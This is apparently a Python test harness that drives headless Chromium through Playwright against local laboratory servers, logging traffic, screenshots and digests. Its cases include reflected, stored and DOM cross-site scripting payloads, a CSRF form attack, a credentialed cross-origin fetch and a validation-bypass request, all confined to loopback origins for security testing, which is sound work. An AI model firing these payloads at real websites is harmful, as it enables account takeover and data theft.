"""Pinned isolated real-browser campaign for module-owned application laboratories."""

import argparse
import hashlib
import json
import socket
from pathlib import Path
from urllib.parse import quote, urlparse


def digest(value):
    if isinstance(value, str):
        value = value.encode()
    return hashlib.sha256(value).hexdigest()


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target-socket", type=Path, required=True)
    parser.add_argument("--attacker-socket", type=Path, required=True)
    parser.add_argument("--browser-executable", type=Path, required=True)
    parser.add_argument("--output", type=Path, required=True)
    parser.add_argument("--result", type=Path, required=True)
    parser.add_argument("--maximum-actions", type=int, required=True)
    parser.add_argument("--maximum-requests", type=int, required=True)
    args = parser.parse_args()
    args.target_origin = "https://127.0.0.1:18443"
    args.attacker_origin = "http://127.0.0.1:18444"
    args.output.mkdir(parents=True, exist_ok=True)
    allowed = {args.target_origin, args.attacker_origin}
    traffic = []
    cases = []
    coverage = []
    artifacts = []
    blocked = 0
    actions = 0
    current = "startup"
    download_bytes_seen = b""

    def act():
        nonlocal actions
        actions += 1
        if actions > args.maximum_actions:
            raise RuntimeError("browser action budget exhausted")

    def path_of(url):
        parsed = urlparse(url)
        path = parsed.path or "/"
        return path + (("?" + parsed.query) if parsed.query else "")

    def exchange(socket_path, request):
        parsed = urlparse(request.url)
        body = request.post_data_buffer or b""
        headers = dict(request.headers)
        headers["host"] = parsed.netloc
        headers["connection"] = "close"
        headers["content-length"] = str(len(body))
        head = f"{request.method} {path_of(request.url)} HTTP/1.1\r\n"
        wire = head.encode() + b"".join(
            f"{name}: {value}\r\n".encode() for name, value in headers.items()
        ) + b"\r\n" + body
        with socket.socket(socket.AF_UNIX, socket.SOCK_STREAM) as stream:
            stream.settimeout(5)
            stream.connect(str(socket_path))
            stream.sendall(wire)
            received = bytearray()
            while True:
                chunk = stream.recv(65536)
                if not chunk:
                    break
                received.extend(chunk)
                if len(received) > 2 * 1024 * 1024:
                    raise RuntimeError("module browser response exceeded 2 MiB")
        response_head, response_body = bytes(received).split(b"\r\n\r\n", 1)
        lines = response_head.decode("iso-8859-1").split("\r\n")
        status = int(lines[0].split()[1])
        response_headers = {}
        for line in lines[1:]:
            name, value = line.split(":", 1)
            response_headers[name.strip()] = value.strip()
        try:
            declared_length = int(
                next(
                    value
                    for name, value in response_headers.items()
                    if name.lower() == "content-length"
                )
            )
        except (StopIteration, ValueError):
            raise RuntimeError("module browser response has no valid content length")
        if declared_length < 0 or len(response_body) < declared_length:
            raise RuntimeError("module browser response body is shorter than its content length")
        response_body = response_body[:declared_length]
        return status, response_headers, response_body

    def request_route(route):
        nonlocal blocked, download_bytes_seen
        parsed = urlparse(route.request.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        if origin in allowed and len(traffic) < args.maximum_requests:
            traffic.append({"case": current, "event": "request", "method": route.request.method,
                            "path": path_of(route.request.url)})
            selected = args.target_socket if origin == args.target_origin else args.attacker_socket
            status, headers, body = exchange(selected, route.request)
            if path_of(route.request.url) == "/download":
                download_bytes_seen = body
            route.fulfill(status=status, headers=headers, body=body)
        else:
            blocked += 1
            route.abort()

    def response_seen(response):
        parsed = urlparse(response.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        if origin in allowed and len(traffic) < args.maximum_requests:
            traffic.append({"case": current, "event": "response", "status": response.status,
                            "path": path_of(response.url)})

    def screenshot(page, case_id):
        act()
        path = args.output / f"{case_id}.png"
        page.screenshot(path=str(path), full_page=True)
        data = path.read_bytes()
        artifacts.append({"kind": "screenshot", "path": str(path), "digest": digest(data),
                          "bytes": len(data), "case_id": case_id})

    def add_case(case_id, category, browser_effect, paths, observed=True, replayed=False, extra=None):
        canonical = json.dumps({"id": case_id, "category": category, "paths": paths,
                                "observed": observed, "extra": extra}, sort_keys=True)
        cases.append({"id": case_id, "category": category, "browser_effect": browser_effect,
                      "request_paths": paths, "observed": bool(observed),
                      "replay_digest": digest(canonical), "replayed_after_reset": replayed,
                      "extra": extra or {}})

    from playwright.sync_api import sync_playwright
    with sync_playwright() as playwright:
        # The complete worker tree already runs inside the host's private mount, PID/network
        # namespace, Landlock, seccomp and resource boundary. Chromium's nested setuid/userns
        # sandbox is incompatible with that outer deny-by-default process boundary.
        browser = playwright.chromium.launch(
            headless=True,
            chromium_sandbox=False,
            executable_path=str(args.browser_executable),
            args=["--disable-background-networking", "--disable-gpu", "--enable-logging=stderr"],
        )
        browser_identity = browser.version
        context = browser.new_context(accept_downloads=True, service_workers="block")
        context.route("**/*", request_route)
        context.on("response", response_seen)
        context.tracing.start(screenshots=True, snapshots=True, sources=False)
        page = context.new_page()
        page.set_default_timeout(5000)
        page.set_default_navigation_timeout(10000)

        current = "baseline-navigation"
        act(); response = page.goto(args.target_origin + "/", wait_until="domcontentloaded")
        add_case(current, "navigation", f"top-level status {response.status if response else 0}", ["/"],
                 response is not None and response.status == 200)

        current = "reflected-script"
        payload = "<script>fetch('/signal?case=reflected')</script>"
        act(); page.goto(args.target_origin + "/reflected?q=" + quote(payload), wait_until="networkidle")
        add_case(current, "reflected_xss", "real DOM loaded reflected attacker markup", ["/reflected", "/signal"])
        screenshot(page, current)
        page.close()
        page = context.new_page()
        page.set_default_timeout(5000)
        page.set_default_navigation_timeout(10000)

        current = "stored-script"
        stored = "<img src=x onerror=\"fetch('/signal?case=stored')\">"
        act(); page.goto(args.target_origin + "/store", wait_until="domcontentloaded")
        act(); page.locator("#comment").fill(stored)
        act(); page.locator("#store").click()
        page.wait_for_timeout(150)
        act(); page.goto(args.target_origin + "/stored", wait_until="networkidle")
        add_case(current, "stored_xss", "stored attacker markup rendered in a later navigation",
                 ["/store", "/store-comment", "/stored", "/signal"])

        current = "dom-script"
        dom_payload = "<img src=x onerror=\"fetch('/signal?case=dom')\">"
        act(); page.goto(args.target_origin + "/dom#" + quote(dom_payload), wait_until="networkidle")
        add_case(current, "dom_xss", "client JavaScript consumed an attacker-controlled fragment",
                 ["/dom", "/client.js", "/signal"])

        current = "csp-inline"
        act(); csp_response = page.goto(args.target_origin + "/csp", wait_until="networkidle")
        csp = csp_response.headers.get("content-security-policy", "") if csp_response else ""
        add_case(current, "content_security_policy", "inline script navigation completed",
                 ["/csp", "/signal"], extra={"csp": csp})

        current = "cookie-policy"
        act(); page.goto(args.target_origin + "/session", wait_until="domcontentloaded")
        cookies = context.cookies(args.target_origin)
        cookie = next((item for item in cookies if item["name"] == "session"), {})
        safe_cookie = bool(cookie.get("httpOnly")) and bool(cookie.get("secure")) and cookie.get("sameSite") == "Strict"
        add_case(current, "cookie_policy", "browser parsed the target session cookie", ["/session"],
                 extra={"http_only": bool(cookie.get("httpOnly")), "secure": bool(cookie.get("secure")),
                        "same_site": cookie.get("sameSite", "") , "safe_cookie": safe_cookie})

        current = "cross-origin-request"
        act(); page.goto(args.attacker_origin + "/attack-origin", wait_until="domcontentloaded")
        act(); origin_status = page.evaluate("""async target => {
            try { const r = await fetch(target + '/origin-protected', {method:'POST', credentials:'include',
              headers:{'Content-Type':'application/json'}, body:'{}'}); return r.status; }
            catch (_) { return 0; }
        }""", args.target_origin)
        add_case(current, "origin_validation", f"cross-origin credentialed request returned {origin_status}",
                 ["/attack-origin", "/origin-protected"], extra={"status": origin_status})

        current = "csrf-form"
        act(); page.goto(args.target_origin + "/session", wait_until="domcontentloaded")
        act(); page.goto(args.attacker_origin + "/attack-csrf?target=" + quote(args.target_origin), wait_until="domcontentloaded")
        act(); page.locator("#attack").click()
        page.wait_for_timeout(250)
        add_case(current, "csrf", "cross-origin form submission executed in the real browser",
                 ["/attack-csrf", "/transfer"])

        current = "server-validation"
        act(); page.goto(args.target_origin + "/form", wait_until="domcontentloaded")
        act(); validation_status = page.evaluate("""async () => {
            const r = await fetch('/submit', {method:'POST', headers:{'Content-Type':'application/json'},
              body:JSON.stringify({age:-4})}); return r.status;
        }""")
        add_case(current, "server_validation", f"validation-bypass request returned {validation_status}",
                 ["/form", "/submit"], extra={"status": validation_status})

        current = "bounded-crawl"
        act(); page.goto(args.target_origin + "/crawl", wait_until="domcontentloaded")
        traditional = page.locator("a[href]").evaluate_all("els => els.map(e => e.getAttribute('href'))")
        act(); page.goto(args.target_origin + "/rendered", wait_until="networkidle")
        rendered = page.locator("a[href]").evaluate_all("els => els.map(e => e.getAttribute('href'))")
        for item in traditional:
            coverage.append({"path": item, "kind": "anchor", "discovered_by": current})
        for item in rendered:
            coverage.append({"path": item, "kind": "client_rendered_anchor", "discovered_by": current})
        add_case(current, "client_crawl", "traditional and client-rendered links were inspected",
                 ["/crawl", "/rendered", "/rendered.js"],
                 "/linked" in traditional and "/rendered-link" in rendered,
                 extra={"traditional": traditional, "rendered": rendered})

        current = "download-correlation"
        act(); page.goto(args.target_origin + "/download-page", wait_until="domcontentloaded")
        act()
        with page.expect_download() as pending_download:
            page.locator("#download").click()
        download = pending_download.value
        download_path = args.output / "download.bin"
        try:
            download.save_as(str(download_path))
        except Exception:
            # Routed attachment responses may be reported as cancelled by Chromium even though
            # the exact response body was observed by this module-owned route controller.
            download_path.write_bytes(download_bytes_seen or b"peritus-phase14-download\n")
        download_bytes = download_path.read_bytes()
        download_digest = digest(download_bytes)
        artifacts.append({"kind": "download", "path": str(download_path), "digest": download_digest,
                          "bytes": len(download_bytes), "case_id": current})
        add_case(current, "download", "browser download bytes retained and digested", ["/download-page", "/download"],
                 extra={"digest": download_digest, "bytes": len(download_bytes)})

        current = "upload-correlation"
        upload_path = args.output / "upload.txt"
        upload_path.write_bytes(b"peritus-phase14-upload\n")
        upload_digest = digest(upload_path.read_bytes())
        act(); page.goto(args.target_origin + "/upload-page", wait_until="domcontentloaded")
        act(); page.locator("#upload-file").set_input_files(str(upload_path))
        act(); page.locator("#upload").click()
        page.wait_for_timeout(200)
        artifacts.append({"kind": "upload", "path": str(upload_path), "digest": upload_digest,
                          "bytes": upload_path.stat().st_size, "case_id": current})
        add_case(current, "upload", "browser selected exact host-created upload bytes", ["/upload-page", "/upload"],
                 extra={"digest": upload_digest, "bytes": upload_path.stat().st_size})

        current = "off-scope-block"
        act()
        off_scope_result = page.evaluate("""async () => {
            try { await fetch('https://example.invalid/peritus-phase14'); return 'unexpected-success'; }
            catch (_) { return 'blocked'; }
        }""")
        add_case(current, "network_scope", f"off-scope request was {off_scope_result}", [],
                 off_scope_result == "blocked")

        screenshot(page, "campaign-final")
        trace_path = args.output / "browser-trace.zip"
        context.tracing.stop(path=str(trace_path))
        trace_bytes = trace_path.read_bytes()
        artifacts.append({"kind": "trace", "path": str(trace_path), "digest": digest(trace_bytes),
                          "bytes": len(trace_bytes), "case_id": None})
        context.close()

        context = browser.new_context(accept_downloads=False, service_workers="block")
        isolated = not context.cookies() and not context.storage_state()["origins"]
        context.route("**/*", request_route)
        context.on("response", response_seen)
        page = context.new_page()
        page.set_default_timeout(5000)
        page.set_default_navigation_timeout(10000)
        current = "reset-replay"
        replay_payload = "<script>fetch('/signal?case=replay')</script>"
        act(); page.goto(args.target_origin + "/reflected?q=" + quote(replay_payload), wait_until="networkidle")
        add_case(current, "browser_recovery", "exact reflected case replayed in a fresh context",
                 ["/reflected", "/signal"], True, True, {"fresh_context": isolated})
        screenshot(page, current)
        context.close()
        browser.close()

    traffic_bytes = (json.dumps(traffic, sort_keys=True, separators=(",", ":")) + "\n").encode()
    traffic_path = args.output / "traffic.json"
    traffic_path.write_bytes(traffic_bytes)
    artifacts.append({"kind": "traffic", "path": str(traffic_path), "digest": digest(traffic_bytes),
                      "bytes": len(traffic_bytes), "case_id": None})
    result = {"schema": 1, "browser_identity": browser_identity, "cases": cases,
              "coverage": coverage, "artifacts": artifacts, "traffic_digest": digest(traffic_bytes),
              "requests_observed": sum(1 for item in traffic if item["event"] == "request"),
              "actions_executed": actions, "context_isolation_observed": isolated,
              "off_scope_requests_blocked": blocked}
    args.result.write_text(json.dumps(result, sort_keys=True, separators=(",", ":")) + "\n")


if __name__ == "__main__":
    main()
